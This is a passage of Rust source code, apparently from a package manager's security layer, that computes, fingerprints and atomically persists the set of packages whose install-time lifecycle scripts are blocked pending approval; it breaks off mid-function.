//! — `<project_dir>/.lpm/build-state.json` persistence layer.
//!
//! This file is the spine of the `lpm approve-scripts` review flow. It captures
//! the install-time blocked set (packages with lifecycle scripts that aren't
//! covered by an existing strict approval) so:
//!
//! 1. The post-install warning ("8 packages blocked") only fires when the
//!    blocked set has CHANGED since the last install — repeated installs of
//!    the same project don't re-warn.
//! 2. `lpm approve-scripts` doesn't have to re-walk the store on startup —
//!    it reads from this file directly.
//!
//! ## Location
//!
//! `<project_dir>/.lpm/build-state.json` (NOT `node_modules/.lpm/build-state.json`).
//! See **F7** in the status doc for the rationale: `.lpm/` next to
//! `package.json` survives `rm -rf node_modules`, matches the existing
//! `install-hash` convention, and avoids colliding with the linker's
//! pnpm-style internal store at `node_modules/.lpm/`.
//!
//! ## Schema versioning
//!
//! [`BUILD_STATE_VERSION`] is bumped on every breaking change. The reader
//! returns `None` for unknown versions (forward-compat: never read state
//! files newer than what we know how to parse).
//!
//! ## Atomic writes
//!
//! [`write_build_state`] writes to a tempfile alongside the target and
//! renames it into place. A crash mid-write leaves the previous state file
//! intact rather than producing a half-written file the reader chokes on.

use lpm_common::LpmError;
use lpm_security::{
    SecurityPolicy, TrustMatch, script_hash::compute_script_hash_with_phase_bodies,
    triage::StaticTier,
};
use lpm_store::PackageStore;
use lpm_workspace::ProvenanceSnapshot;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

/// Schema version for [`BuildState`].
///
/// **Bump policy:** only on **breaking** changes (field type change,
/// field removal, semantic change of an existing field). Adding new
/// `Option<T>` fields with `#[serde(default)]` is NON-breaking and does
/// NOT warrant a bump — serde silently drops unknown fields on read
/// (the struct is not `deny_unknown_fields`) and missing fields default
/// to `None`. This gives mutual compatibility between readers of
/// different ages without invalidating every existing
/// `.lpm/build-state.json` in the wild.
///
/// adds several `Option<T>` fields to [`BlockedPackage`]
/// (static tier, provenance snapshot, publish timestamp, behavioral-tags
/// hash) without bumping this constant. See the plan for the
/// rationale.
///
/// Reader policy (see [`read_build_state`]): accept anything
/// `<= BUILD_STATE_VERSION`; refuse newer versions (forward-incompatible
/// bumps signal a meaningful schema change that older readers can't
/// interpret safely).
pub const BUILD_STATE_VERSION: u32 = 1;

/// Filename inside `<project_dir>/.lpm/`.
pub const BUILD_STATE_FILENAME: &str = "build-state.json";

static BUILD_STATE_WRITE_NS: AtomicU64 = AtomicU64::new(0);
static BUILD_STATE_WRITE_COUNT: AtomicU64 = AtomicU64::new(0);

#[derive(Debug, Clone, Copy, Default)]
pub(crate) struct BuildStateWriteTiming {
    pub(crate) write_ms: u64,
    pub(crate) write_count: u64,
}

pub(crate) fn reset_write_timing() {
    BUILD_STATE_WRITE_NS.store(0, Ordering::Relaxed);
    BUILD_STATE_WRITE_COUNT.store(0, Ordering::Relaxed);
}

pub(crate) fn snapshot_write_timing() -> BuildStateWriteTiming {
    BuildStateWriteTiming {
        write_ms: BUILD_STATE_WRITE_NS.load(Ordering::Relaxed) / 1_000_000,
        write_count: BUILD_STATE_WRITE_COUNT.load(Ordering::Relaxed),
    }
}

fn record_write_timing(elapsed: std::time::Duration) {
    BUILD_STATE_WRITE_NS.fetch_add(elapsed.as_nanos() as u64, Ordering::Relaxed);
    BUILD_STATE_WRITE_COUNT.fetch_add(1, Ordering::Relaxed);
}

/// Top-level shape of `build-state.json`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BuildState {
    /// Bumped on every breaking change to this struct or to
    /// [`BlockedPackage`]. Readers compare against [`BUILD_STATE_VERSION`]
    /// and treat any mismatch as "no state, re-emit warning".
    pub state_version: u32,
    /// Deterministic SHA-256 over the sorted blocked-package list.
    /// Used by the install pipeline to decide whether to suppress the
    /// "N packages blocked" banner — it suppresses iff the fingerprint
    /// matches the previous run.
    pub blocked_set_fingerprint: String,
    /// RFC 3339 timestamp of when this state file was written. Used by
    /// future stale-state detection but not by  the     /// suppression logic, which is purely fingerprint-based.
    pub captured_at: String,
    /// The packages whose lifecycle scripts were blocked at the time of
    /// the install that wrote this file. Sorted by `(name, version)` for
    /// deterministic fingerprinting.
    pub blocked_packages: Vec<BlockedPackage>,

    /// M3: audit trail for `--ignore-provenance-drift[-all]`. Set to
    /// `Some(...)` when the install that wrote this state file had a
    /// drift override active. `None` means drift was enforced normally.
    /// Skipped from on-disk JSON when None to keep the common-case
    /// shape clean and forward-compatible with pre-fix readers.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub drift_ignore_override: Option<DriftIgnoreAuditRecord>,
}

/// Persistent record of a `--ignore-provenance-drift[-all]` override
/// honoured by the install that wrote `build-state.json`. Surfaces in
/// `lpm doctor` and audit logs so a waiver can't hide indefinitely
/// behind the per-install advisory printed at install time.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DriftIgnoreAuditRecord {
    /// `"all"` (from `--ignore-provenance-drift-all`) or `"names"`
    /// (from one or more `--ignore-provenance-drift <name>` flags).
    pub mode: String,
    /// Sorted list of package names waived. Empty for `mode = "all"`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub names: Vec<String>,
    /// RFC 3339 timestamp of when the override was honoured.
    pub honoured_at: String,
}

/// One entry in [`BuildState::blocked_packages`].
///
/// adds the `static_tier`, `provenance_at_capture`,
/// `published_at`, and `behavioral_tags_hash` fields as
/// `Option<T>` with `skip_serializing_if = "Option::is_none"`. This
/// extension is backward-compatible with v1-written state (defaults to
/// `None`) and forward-compatible with pre-46 readers (serde drops
/// unknown fields; no `deny_unknown_fields` on this struct). See the
/// `BUILD_STATE_VERSION` policy comment for the no-version-bump
/// rationale.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct BlockedPackage {
    pub name: String,
    pub version: String,
    /// Exact lockfile source used for installation.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source: Option<String>,
    /// SRI integrity hash from the lockfile, if known. binds
    /// approvals to this so a registry-side tarball swap re-opens review.
    pub integrity: Option<String>,
    /// Deterministic install-script hash from
    /// `lpm_security::script_hash::compute_script_hash`. binds
    /// approvals to this so any change to the executed script bytes
    /// re-opens review. May be `None` for packages whose store directory
    /// is missing or unreadable at install time (the gate fails closed —
    /// such packages stay blocked until the next install repopulates).
    pub script_hash: Option<String>,
    /// Which install phases (subset of [`lpm_security::EXECUTED_INSTALL_PHASES`])
    /// have non-empty bodies. Used by `lpm approve-scripts` for human display.
    pub phases_present: Vec<String>,
    /// True if there IS an existing rich entry in `trustedDependencies`
    /// for this `name@version` but the stored binding doesn't match the
    /// current `(integrity, script_hash)`. Distinguishes "first-time
    /// blocked" from "previously approved, now drifted, needs re-review".
    pub binding_drift: bool,

    // ─── additions (all optional; see struct doc) ─────────
    /// Static-gate classification from Layer 1 (P2). `None`
    /// in-only state (the field exists but the classifier is not
    /// wired yet) and for packages captured with `script-policy =
    /// "deny" | "allow"` where classification is not applied.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub static_tier: Option<StaticTier>,
    /// Publisher-identity snapshot at capture time. Populated by
    /// (provenance drift). `None` in/P2/P3 state, and for packages
    /// whose registry response contains no attestation bundle.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub provenance_at_capture: Option<ProvenanceSnapshot>,
    /// RFC 3339 publish timestamp as returned by the registry's
    /// metadata `time` map for this version. Populated by from the
    /// TTL-cached metadata the install pipeline already fetches for
    /// the cooldown check. `None` for offline installs or packages
    /// whose metadata response omitted the timestamp.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub published_at: Option<String>,
    /// SHA-256 of the sorted set of behavioral tags that were `true`
    /// on this version's server-computed analysis. Populated by
    /// from the metadata the install pipeline already parses. Used by
    ///'s version-diff UI to surface "behavioral tags changed since
    /// last approval" without re-fetching metadata. `None` for
    /// packages without server-side behavioral analysis.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub behavioral_tags_hash: Option<String>,
    /// Sorted canonical names of the active behavioral
    /// tags whose hash is in `behavioral_tags_hash`. Persisted alongside
    /// the hash so's version-diff UI can render the *delta* (e.g.
    /// `gained network, eval`), not just "tags changed". The hash is
    /// kept for fast equality / fingerprinting; the names enable
    /// human-readable rendering without a re-fetch.
    ///
    /// Populated from the same registry response as
    /// `behavioral_tags_hash` via [`lpm_security::triage::active_tag_names`].
    /// `None` whenever `behavioral_tags_hash` is `None`; `Some(vec![])`
    /// when the version has the analysis but every tag is false.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub behavioral_tags: Option<Vec<String>>,
}

/// Exact installed package identity used by lifecycle security decisions.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct InstalledPackageIdentity {
    pub name: String,
    pub version: String,
    pub source: Option<String>,
    pub integrity: Option<String>,
}

impl InstalledPackageIdentity {
    pub fn new(
        name: impl Into<String>,
        version: impl Into<String>,
        source: Option<String>,
        integrity: Option<String>,
    ) -> Self {
        Self {
            name: name.into(),
            version: version.into(),
            source,
            integrity,
        }
    }

    pub fn package_key(&self) -> lpm_lockfile::PackageKey {
        let source_id = self
            .source
            .as_deref()
            .and_then(|source| lpm_lockfile::Source::parse(source).ok())
            .map_or_else(
                || lpm_lockfile::PackageKey::UNKNOWN_SOURCE_ID.to_string(),
                |source| source.source_id_with_integrity(self.integrity.as_deref()),
            );
        lpm_lockfile::PackageKey::new(&self.name, &self.version, source_id)
    }
}

/// Result of [`capture_blocked_set_after_install`] — exposes the new state
/// AND whether the install pipeline should emit the post-install warning.
#[derive(Debug, Clone)]
pub struct BlockedSetCapture {
    /// The fresh `BuildState` that was just persisted.
    pub state: BuildState,
    /// Fingerprint from the previous install, if a state file existed.
    /// `None` means "no previous state" (first install, or state was
    /// deleted, or version mismatch).
    pub previous_fingerprint: Option<String>,
    /// Whether the install pipeline should emit a banner. The rule:
    /// - First install ever (no previous state): true if blocked_packages non-empty
    /// - Fingerprint changed (anything different): true
    /// - All previously blocked are now approved (current empty, prev non-empty): true (positive banner)
    /// - Fingerprint unchanged: false
    /// - First install ever AND no blocked packages: false
    pub should_emit_warning: bool,
    /// True iff the warning is the "all approved!" celebration. Lets the
    /// caller render a different message than the default "N blocked".
    pub all_clear_banner: bool,
}

/// Read the build-state file from `<project_dir>/.lpm/build-state.json`.
///
/// Returns `None` if:
/// - The file is missing
/// - The file fails to parse as JSON
/// - The file's `state_version` is **newer** than this binary supports
///
/// Older `state_version` values are accepted: the struct's new optional
/// fields default to `None` via their `#[serde(default)]` attribute,
/// producing a valid [`BuildState`] with degraded but usable content.
/// This is the forward-compat side of the no-version-bump policy
/// documented on [`BUILD_STATE_VERSION`]; the backward-compat side is
/// that absence of `deny_unknown_fields` lets older readers silently
/// drop fields written by newer writers.
///
/// All three failure modes are treated identically by callers: "no
/// previous state". The caller will write a fresh state on the next
/// install.
pub fn read_build_state(project_dir: &Path) -> Option<BuildState> {
    let path = build_state_path(project_dir);
    let bytes = lpm_common::read_capped_state_file(&path, lpm_common::STATE_FILE_SIZE_CAP_BYTES)
        .ok()
        .flatten()?;
    let state: BuildState = serde_json::from_slice(&bytes).ok()?;
    if state.state_version > BUILD_STATE_VERSION {
        // Newer file written by a future LPM binary. We can't safely
        // interpret its semantics, so treat as missing and let the
        // current run write a fresh state. (Next time the newer LPM
        // runs, it will overwrite with a newer-version file again.)
        tracing::debug!(
            "build-state.json is newer than this binary supports \
             (got v{}, max v{}) — treating as missing",
            state.state_version,
            BUILD_STATE_VERSION,
        );
        return None;
    }
    Some(state)
}

/// Atomically write `state` to `<project_dir>/.lpm/build-state.json`.
///
/// Writes to a tempfile alongside the target then renames it into place.
/// A crash between the write and the rename leaves the previous state file
/// intact rather than corrupting it.
pub fn write_build_state(project_dir: &Path, state: &BuildState) -> Result<(), LpmError> {
    let write_start = std::time::Instant::now();
    let lpm_dir = project_dir.join(".lpm");
    std::fs::create_dir_all(&lpm_dir).map_err(LpmError::Io)?;

    let target = build_state_path(project_dir);
    // Use a unique tempfile name (PID + nanos) so concurrent installs of
    // the same project don't clobber each other's tempfiles. The rename
    // is still the consistency boundary — last writer wins.
    let pid = std::process::id();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| d.as_nanos());
    let tmp = lpm_dir.join(format!(".{BUILD_STATE_FILENAME}.{pid}.{nanos}.tmp"));

    let json = serde_json::to_string_pretty(state)
        .map_err(|e| LpmError::Registry(format!("failed to serialize build state: {e}")))?;
    std::fs::write(&tmp, format!("{json}\n")).map_err(LpmError::Io)?;
    std::fs::rename(&tmp, &target).map_err(|e| {
        // Best-effort cleanup of the tempfile if the rename failed.
        let _ = std::fs::remove_file(&tmp);
        LpmError::Io(std::io::Error::new(
            e.kind(),
            format!(
                "failed to rename build-state tempfile into place: {e} \
                 (target: {})",
                target.display()
            ),
        ))
    })?;
    record_write_timing(write_start.elapsed());
    Ok(())
}

/// Compute the deterministic fingerprint over a slice of blocked packages.
///
/// **Determinism contract:** the fingerprint MUST be stable across:
/// - Reorders of the input slice (sorted internally before hashing)
/// - Different operating systems
/// - Different versions of `serde_json` (we don't serialize through it)
///
/// The hash input format is one line per package, NUL-terminated:
///   `<name>@<version>|<source-or-empty>|<integrity-or-empty>|<script_hash-or-empty>\x00`
/// sorted lexicographically. The output is `sha256-<hex>`
/// to match the script_hash format.
pub fn compute_blocked_set_fingerprint(packages: &[BlockedPackage]) -> String {
    let mut keys: Vec<String> = packages
        .iter()
        .map(|p| {
            format!(
                "{}@{}|{}|{}|{}",
                p.name,
                p.version,
                p.source.as_deref().unwrap_or(""),
                p.integrity.as_deref().unwrap_or(""),
                p.script_hash.as_deref().unwrap_or(""),
            )
        })
        .collect();
    keys.sort();

    let mut hasher = Sha256::new();
    for key in keys {
        hasher.update(key.as_bytes());
        hasher.update([0u8]);
    }
    format!("sha256-{}", hex_lower(&hasher.finalize()))
}

/// Per-package metadata  that enriches the captured
/// blocked-set beyond what's derivable from the store alone.
///
/// The install pipeline already fetches registry metadata during the
/// cooldown check for every resolved package; extends that
/// fetch to also forward `publishedAt` and a hash of the package's
/// server-computed behavioral tags into `BlockedPackage`. Both fields
/// are optional and missing entries degrade gracefully to `None` in
/// the output (offline installs, npm packages without server-side
/// behavioral analysis, lockfile fast-path without a metadata fetch
/// for that version — all work).
///
/// Keyed by the exact lockfile [`lpm_lockfile::PackageKey`].
#[derive(Debug, Clone, Default)]
pub struct BlockedSetMetadata {
    pub by_pkg: std::collections::HashMap<lpm_lockfile::PackageKey, BlockedSetMetadataEntry>,
}

/// One entry in [`BlockedSetMetadata`].
#[derive(Debug, Clone, Default)]
pub struct BlockedSetMetadataEntry {
    /// Exact lockfile source used to install this package.
    pub source: Option<String>,
    /// RFC 3339 publish timestamp from the registry's `time` map for
    /// this version. `None` for offline, fast-path without a metadata
    /// fetch, or packages whose registry response omits the timestamp.
    pub published_at: Option<String>,
    /// SHA-256 over the sorted set of `true` behavioral-analysis tags
    /// (see `lpm_security::triage::hash_behavioral_tag_set`). `None`
    /// for packages without server-side behavioral analysis.
    pub behavioral_tags_hash: Option<String>,
    /// Sorted canonical names of the active behavioral
    /// tags whose hash is `behavioral_tags_hash`. Forwarded into
    /// [`BlockedPackage::behavioral_tags`] so's version-diff UI can
    /// render the *delta* between the prior-approved binding and the
    /// candidate version without a registry re-fetch (which would break
    /// offline updates and add latency). `None` whenever
    /// `behavioral_tags_hash` is `None`.
    pub behavioral_tags: Option<Vec<String>>,
    /// Provenance snapshot captured at
    /// install time from the registry's `dist.attestations` pointer
    /// (via `crate::provenance_fetch::fetch_provenance_snapshot`).
    /// Forwarded into [`BlockedPackage::provenance_at_capture`] by
    /// [`compute_blocked_packages_with_metadata`] so
    /// `lpm approve-scripts` can propagate it to the binding's
    /// `provenance_at_approval` on approval — closing the
    /// write-path loop.
    ///
    /// `None` for:
    /// - Offline installs (fetcher degraded to `Ok(None)`).
    /// - Packages whose registry omits `dist.attestations` AND the
    ///   install pipeline skipped the per-package fetch (e.g., no
    ///   prior approval reference for this name — no point checking
    ///   drift). The fetcher itself returns
    ///   `Some(ProvenanceSnapshot { present: false, .. })` when the
    ///   registry explicitly has no attestation; that's distinct
    ///   from the install pipeline choosing to skip the fetch
    ///   entirely.
    pub provenance_at_capture: Option<lpm_workspace::ProvenanceSnapshot>,
}

impl BlockedSetMetadata {
    /// Compatibility lookup for callers without source identity. Returns a
    /// value only when the coordinate/content query has one exact match.
    pub fn get(
        &self,
        name: &str,
        version: &str,
        integrity: Option<&str>,
    ) -> Option<&BlockedSetMetadataEntry> {
        let mut matches = self.by_pkg.iter().filter_map(|(key, entry)| {
            let candidate = InstalledPackageIdentity::new(
                name,
                version,
                entry.source.clone(),
                integrity.map(str::to_string),
            );
            (key == &candidate.package_key()).then_some(entry)
        });
        let entry = matches.next()?;
        matches.next().is_none().then_some(entry)
    }

    pub fn get_exact(
        &self,
        identity: &InstalledPackageIdentity,
    ) -> Option<&BlockedSetMetadataEntry> {
        self.by_pkg.get(&identity.package_key())
    }

    /// Insert or overwrite metadata for one exact package identity.
    pub fn insert(
        &mut self,
        name: String,
        version: String,
        integrity: Option<String>,
        entry: BlockedSetMetadataEntry,
    ) {
        let identity =
            InstalledPackageIdentity::new(name, version, entry.source.clone(), integrity);
        self.by_pkg.insert(identity.package_key(), entry);
    }

    /// Merge registry enrichment only when it belongs to the selected source.
    pub fn merge_enrichment(
        &mut self,
        name: String,
        version: String,
        integrity: Option<String>,
        entry: BlockedSetMetadataEntry,
    ) {
        use std::collections::hash_map::Entry;

        let identity =
            InstalledPackageIdentity::new(name, version, entry.source.clone(), integrity);
        match self.by_pkg.entry(identity.package_key()) {
            Entry::Vacant(slot) => {
                slot.insert(entry);
            }
            Entry::Occupied(mut slot) if slot.get().source == entry.source => {
                slot.insert(entry);
            }
            Entry::Occupied(_) => {}
        }
    }
}

/// Compute the install-time blocked set for a project.
///
/// Walks `installed`, looks at each package's lifecycle scripts via the
/// store, and includes any package whose script hash is NOT covered by
/// an existing strict approval in `policy.trusted_dependencies`.
///
/// Returns the list sorted by `(name, version)` so the caller can pass
/// it directly to [`compute_blocked_set_fingerprint`].
///
/// This wrapper calls [`compute_blocked_packages_with_metadata`] with
/// an empty metadata map; the `published_at` and
/// `behavioral_tags_hash` fields on emitted `BlockedPackage` entries
/// stay `None`. The production install path calls
/// `compute_blocked_packages_with_metadata` directly with a populated
/// map; tests keep using this signature.
pub fn compute_blocked_packages(
    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
) -> Vec<BlockedPackage> {
    // Convenience wrapper: empty metadata + baseline capability
    // inputs. Baseline inputs never flip a strict-matched package
    // into the blocked set, so this preserves pre-6c behavior for
    // every caller that doesn't care about capability enforcement
    // (notably the in-file tests).
    compute_blocked_packages_with_metadata(
        store,
        installed,
        policy,
        &BlockedSetMetadata::default(),
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    )
}

/// metadata-aware variant of [`compute_blocked_packages`].
///
/// Same logic but forwards per-package `published_at` and
/// `behavioral_tags_hash` from `metadata` into each emitted
/// [`BlockedPackage`]. The fingerprint is unaffected (intentionally —
/// it's a stability metric over *blockable* packages, not over their
/// metadata).
#[allow(clippy::too_many_arguments)]
pub fn compute_blocked_packages_with_metadata(
    store: &PackageStore,
    installed: &[(String, String, Option<String>)],
    policy: &SecurityPolicy,
    metadata: &BlockedSetMetadata,
    // The project's
    // capability request + user bound. Used to catch the     // case: a package whose script-hash approval matches strict
    // but whose capability request widens beyond the user's
    // bound without a matching capability-hash approval. Without
    // this check, such packages would sail past install-time
    // capture (TrustMatch::Strict → not blocked), leaving the
    // user no path to resolve the later `CapabilityNotApproved`
    // that `lpm rebuild` / `lpm rebuild` emits when the script
    // finally tries to run.
    //
    // Baseline defaults from the convenience wrapper produce
    // zero behavior change — baseline requests never widen, so
    // the helper below returns false and the strict-match
    // short-circuit applies as before.
    requested_capabilities: &crate::capability::CapabilitySet,
    user_bound: &crate::capability::UserBound,
    // Ephemeral advisor approval set keyed
    // by `(name, version, Option<integrity>)`. Packages whose
    // triple appears here are EXCLUDED from the blocked set so
    // post-install messaging + `lpm approve-scripts` don't report
    // them as still-blocked after the autoBuild path executed
    // their scripts via the AdvisorApprovedThisRun trust path.
    //
    // Caller-side conditional: install passes `Some(view)` only
    // when auto-build will actually execute approved scripts this
    // run; when auto-build is skipped it passes `None` so approved-
    // but-not-run packages remain in the persisted blocked set and
    // stay reachable via `lpm approve-scripts`. See
    // `select_approvals_for_capture` in `crate::commands::install`.
    //
    // Standalone callers (no install context) pass `None` →
    // identical to the pre-slice-1 behavior.
    advisor_approvals: Option<
        &std::collections::HashSet<crate::triage_advisor_session::AdvisorApprovalKey>,
    >,
) -> Vec<BlockedPackage> {
    let identities = installed
        .iter()
        .map(|(name, version, integrity)| {
            InstalledPackageIdentity::new(name, version, None, integrity.clone())
        })
        .collect::<Vec<_>>();
    compute_blocked_packages_with_metadata_for_identities(
        store,
        &identities,
        policy,
        metadata,
        requested_capabilities,
        user_bound,
        advisor_approvals,
    )
}

#[allow(clippy::too_many_arguments)]
pub fn compute_blocked_packages_with_metadata_for_identities(
    store: &PackageStore,
    installed: &[InstalledPackageIdentity],
    policy: &SecurityPolicy,
    metadata: &BlockedSetMetadata,
    requested_capabilities: &crate::capability::CapabilitySet,
    user_bound: &crate::capability::UserBound,
    advisor_approvals: Option<
        &std::collections::HashSet<crate::triage_advisor_session::AdvisorApprovalKey>,
    >,
) -> Vec<BlockedPackage> {
    compute_blocked_packages_with_metadata_and_baseline(
        store,
        installed,
        policy,
        metadata,
        requested_capabilities,
        user_bound,
        BlockedPackageComputationExtras {
            advisor_approvals,
            execution_exclusions: None,
            baseline_index: None,
        },
    )
}

struct BlockedPackageComputationExtras<'a> {
    advisor_approvals:
        Option<&'a std::collections::HashSet<crate::triage_advisor_session::AdvisorApprovalKey>>,
    execution_exclusions: Option<&'a HashSet<crate::commands::rebuild::RebuildPackageIdentity>>,
    baseline_index: Option<&'a lpm_store::V2BaselineIndex>,
}

fn compute_blocked_packages_with_metadata_and_baseline(
    store: &PackageStore,
    installed: &[InstalledPackageIdentity],
    policy: &SecurityPolicy,
    metadata: &BlockedSetMetadata,
    requested_capabilities: &crate::capability::CapabilitySet,
    user_bound: &crate::capability::UserBound,
    extras: BlockedPackageComputationExtras<'_>,
) -> Vec<BlockedPackage> {
    use rayon::prelude::*;

    // Parallelize the per-package walk via rayon. Each iteration is
    // independent: two package.json reads + a static-gate classification
    // + a pure policy lookup + a metadata hashmap read. No shared
    // mutable state across iterations, so `par_iter().filter_map(...)
    // .collect()` is drop-in. Sort below preserves deterministic
    // fingerprint ordering.
    //
    // Measured effect on the in-tree bench fixture (266 pkgs, most
    // lacking install-phase scripts so the per-iter body short-circuits
    // at `compute_script_hash`): wall-clock drops from 7-10ms serial to
    // 4-5ms parallel. Savings grow in proportion to the fraction of
    // packages with install-phase scripts (monorepos with many native
    // builds hit this path more heavily).
    let per_pkg = |identity: &InstalledPackageIdentity| -> Option<BlockedPackage> {
        let name = &identity.name;
        let version = &identity.version;
        let source = identity.source.as_deref();
        let integrity = &identity.integrity;
        // Advisor-approved packages are
        // EXCLUDED from the blocked set entirely. They executed
        // their scripts via the AdvisorApprovedThisRun trust path
        // during this install's autoBuild, so listing them as
        // "still blocked" would emit stale UI + JSON. Keyed on
        // Matching includes source and integrity so approval cannot cross
        // between equal-coordinate packages. The bundle hash remains the
        // final key field because classification is over the package's full
        // install-script bundle.
        if let Some(set) = extras.advisor_approvals
            && set.iter().any(|(n, v, s, i, _)| {
                n == name && v == version && s.as_deref() == source && i == integrity
            })
        {
            return None;
        }
        if let Some(set) = extras.execution_exclusions
            && set.contains(&(
                name.clone(),
                version.clone(),
                identity.source.clone(),
                integrity.clone(),
            ))
        {
            return None;
        }

        let pkg_dir = resolve_blocked_package_dir(store, identity, extras.baseline_index)?;

        let script_data = compute_script_hash_with_phase_bodies(&pkg_dir)?;
        let script_hash = script_data.hash;
        let phase_bodies = script_data.phase_bodies;
        let phases_present: Vec<String> = phase_bodies.iter().map(|(n, _)| n.clone()).collect();

        // Classify each present phase and aggregate
        // worst-wins. Populated unconditionally (not gated on
        // `script-policy`) — the annotation is
        // user-visible UX in all three modes.
        //
        // Pass identity context so a delegate-to-local-file +
        // matching identity body surfaces as Green in the UI's
        // blocked-set annotation, consistent with what the install
        // pipeline's amber filter at
        // `collect_amber_classification_requests` sees.
        //
        // Option B: `publish_age_secs = None` +
        // `min_release_age_secs = 0` means the L1 widening fires
        // independently of cooldown. This is correct here because
        // `compute_blocked_packages_with_metadata` produces a
        // UI-annotation tier on the BLOCKED set. Auto-run
        // packages widened by the install pipeline are already
        // excluded from the blocked set upstream — so the cooldown
        // defense was already applied
        // there. The annotation here only fires for packages
        // already in the blocked set; widening them to Green at
        // annotation time has no security impact (they'll still
        // require `lpm approve-scripts` to run).
        let repository = read_manifest_repository(&pkg_dir);
        let ctx = lpm_security::static_gate::ManifestContext {
            package_name: name.as_str(),
            repository: repository.as_deref(),
            bin_names: &[],
            publish_age_secs: None,
            min_release_age_secs: 0,
        };
        let static_tier: Option<lpm_security::triage::StaticTier> = phase_bodies
            .iter()
            .map(|(_, body)| lpm_security::static_gate::classify_with_context(body, Some(&ctx)))
            .reduce(lpm_security::triage::StaticTier::worse_of);

        let entry = metadata
            .get_exact(identity)
            .or_else(|| metadata.get(name, version, integrity.as_deref()));
        let source = source.or_else(|| entry.and_then(|entry| entry.source.as_deref()));

        // Strict approvals bind source and content identity to the script hash.
        let trust = policy.can_run_scripts_strict_for_identity(
            name,
            version,
            source,
            integrity.as_deref(),
            Some(&script_hash),
        );

        let (is_blocked, binding_drift) = match trust {
            // Strict approval covers this exact tuple — NOT blocked
            // by the script-hash gate — but also consult the capability gate.
            // A Strict-matched package with a widened capability
            // request that the stored binding doesn't cover must
            // still be blocked so approve-scripts can surface it.
            // Without this, install-time capture would silently
            // omit such packages, and `lpm rebuild` would skip them
            // with CapabilityNotApproved downstream — no remediation
            // path for the user.
            TrustMatch::Strict => {
                let binding = policy.trusted_dependencies.get_binding(
                    name,
                    version,
                    source,
                    integrity.as_deref(),
                );
                if requested_capabilities.requires_review_despite_strict_match(user_bound, binding)
                {
                    // `binding_drift = true` so approve-scripts's
                    // existing "previously approved, please re-review"
                    // wording fires. This is the user-accurate
                    // framing for a capability-mismatch: the
                    // previous approval exists but doesn't cover
                    // the current request.
                    (true, true)
                } else {
                    (false, false)
                }
            }
            // Legacy bare-name entry covers it leniently — NOT blocked
            // (the existing build pipeline will run the script with a
            // deprecation warning). Legacy entries have no binding to check the capability
            // hash against; the helper returns true for any widening
            // request against a Legacy match. That's correct — a
            // bare-name approval cannot cover a widening capability
            // request, and surfacing such packages in the blocked set
            // lets the user upgrade to a rich capability-hash-bearing
            // approval via `lpm approve-scripts`.
            TrustMatch::LegacyNameOnly => {
                if requested_capabilities.requires_review_despite_strict_match(user_bound, None) {
                    (true, false)
                } else {
                    (false, false)
                }
            }
            // Rich entry exists but the binding doesn't match — BLOCKED
            // and flagged as drift so approve-scripts can show a special
            // "previously approved, please re-review" message.
            TrustMatch::BindingDrift { .. } => (true, true),
            // No matching entry at all — BLOCKED, first-time review.
            TrustMatch::NotTrusted => (true, false),
        };

        if !is_blocked {
            return None;
        }

        // metadata forwarding. The caller (install.rs)
        // populates `metadata` from the same registry responses
        // the cooldown check already fetched, so this is a
        // memory-only hash-map lookup per package.
        Some(BlockedPackage {
            name: name.clone(),
            version: version.clone(),
            source: source.map(str::to_string),
            integrity: integrity.clone(),
            script_hash: Some(script_hash),
            phases_present,
            binding_drift,
            // populates `static_tier` from the
            // worst-wins reduction above.
            static_tier,
            // forwarded from the install
            // pipeline's per-package provenance fetch. Populated
            // for EVERY blocked package that went through the
            // drift gate, not just those whose drift fired —
            // prevents the previous "hardcoded None" underfill
            // and closes the approve-scripts
            // write-path (binding.provenance_at_approval is
            // written from this value on approval).
            provenance_at_capture: entry.and_then(|e| e.provenance_at_capture.clone()),
            published_at: entry.and_then(|e| e.published_at.clone()),
            behavioral_tags_hash: entry.and_then(|e| e.behavioral_tags_hash.clone()),
            behavioral_tags: entry.and_then(|e| e.behavioral_tags.clone()),
        })
    };

    let walk_start = std::time::Instant::now();
    let mut blocked: Vec<BlockedPackage> = installed.par_iter().filter_map(per_pkg).collect();
    tracing::debug!(
        "perf.post_install_walk pkgs={} ms={}",
        installed.len(),
        walk_start.elapsed().as_millis()
    );

    // Sort for deterministic fingerprinting.
    blocked.sort_by(|a, b| {
        (&a.name, &a.version, &a.source, &a.integrity).cmp(&(
            &b.name,
            &b.version,
            &b.source,
            &b.integrity,
        ))
    });
    blocked
}

fn resolve_blocked_package_dir(
    store: &PackageStore,
    identity: &InstalledPackageIdentity,
    baseline_index: Option<&lpm_store::V2BaselineIndex>,
) -> Option<PathBuf> {
    match baseline_index {
        Some(index) => index
            .lookup_source_identity(
                &identity.name,
                &identity.version,
                &identity.package_key().source_id,
            )
            .map(|baseline| baseline.package_dir.clone()),
        None => Some(store.package_dir(&identity.name, &identity.version)),
    }
}

/// The end-to-end install hook: compute → compare to previous → write →
/// return whether to emit a banner.
///
/// Thin wrapper over [`capture_blocked_set_after_install_with_metadata`]
/// that supplies an empty metadata map + baseline capability
/// defaults.
///
/// All production install paths call `_with_metadata` directly with the project's
/// real `CapabilitySet` + `UserBound` so capture + enforcement
/// cannot diverge. This wrapper is retained solely as the stable
/// test-facing signature; tests that don't exercise the capability
/// gate pass through it to avoid constructing capability defaults
/// by hand.
pub fn capture_blocked_set_after_install(
    project_dir: &Path,
